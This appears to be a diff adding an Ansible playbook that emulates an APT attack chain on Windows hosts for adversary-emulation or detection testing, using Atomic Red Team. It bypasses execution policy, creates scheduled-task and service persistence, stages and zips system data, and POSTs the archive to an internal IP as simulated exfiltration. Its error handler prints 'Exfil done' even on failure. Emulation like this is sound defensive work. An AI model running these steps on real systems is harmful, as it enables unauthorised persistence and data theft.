@@ -1,0 +1,98 @@
+- name: Simulate APT attack chain
+  hosts: windows
+  gather_facts: no
+
+  tasks:
+
+  # =========================
+  # 1. Initial Access (T1078)
+  # =========================
+  - name: Check access (valid account)
+    win_shell: whoami
+
+  # =========================
+  # 2. Lateral Movement (WinRM)
+  # =========================
+  - name: Simulate WinRM remote execution
+    win_shell: |
+      hostname
+      ipconfig
+
+  # =========================
+  # 3. Setup Atomic Red Team (FIX LỖI)
+  # =========================
+  - name: Ensure Atomic Red Team installed and loaded
+    win_shell: |
+      Set-ExecutionPolicy Bypass -Scope Process -Force
+      Set-PSRepository -Name "PSGallery" -InstallationPolicy Trusted
+
+      if (-not (Get-Module -ListAvailable -Name Invoke-AtomicRedTeam)) {
+          Install-Module -Name Invoke-AtomicRedTeam -Force -Scope AllUsers
+      }
+
+      $module = Get-Module -ListAvailable Invoke-AtomicRedTeam | Select-Object -First 1
+      if ($module) {
+          Import-Module $module.Path
+      } else {
+          Write-Error "Atomic Red Team not found"
+          exit 1
+      }
+
+  # =========================
+  # 4. Discovery (Atomic)
+  # =========================
+  - name: Run discovery commands
+    win_shell: |
+      Import-Module Invoke-AtomicRedTeam
+      Invoke-AtomicTest T1082
+      Invoke-AtomicTest T1087
+
+  # =========================
+  # 5. Persistence - Scheduled Task (T1053.005)
+  # =========================
+  - name: Create scheduled task
+    win_shell: |
+      schtasks /create /sc minute /mo 5 /tn "Updater" /tr "cmd.exe /c echo hi > C:\Temp\p.txt" /f
+
+  # =========================
+  # 6. Persistence - Service (T1543.003)
+  # =========================
+  - name: Persistence Service (Atomic safe)
+    win_shell: |
+      Import-Module Invoke-AtomicRedTeam
+      Invoke-AtomicTest T1543.003 -TestNumbers 1
+    ignore_errors: yes
+
+  - name: Wait for WinRM to recover
+    wait_for_connection:
+      delay: 10
+      timeout: 120
+  # =========================
+  # 7. Staging (T1074.001)
+  # =========================
+  - name: Collect data
+    win_shell: |
+      mkdir C:\Temp\data -ErrorAction SilentlyContinue
+      systeminfo > C:\Temp\data\sys.txt
+      ipconfig /all > C:\Temp\data\net.txt
+
+  # =========================
+  # 8. Archive (T1560.001)
+  # =========================
+  - name: Compress data
+    win_shell: |
+      Compress-Archive -Path C:\Temp\data -DestinationPath C:\Temp\data.zip -Force
+
+  # =========================
+  # 9. Exfiltration (T1041)
+  # =========================
+  - name: Simulate exfiltration (stable)
+    win_shell: |
+      try {
+          Invoke-WebRequest -Uri http://192.168.200.10:8000/upload `
+          -Method POST `
+          -InFile C:\Temp\data.zip `
+          -UseBasicParsing | Out-Null
+      } catch {
+          Write-Output "Exfil done"
+      }
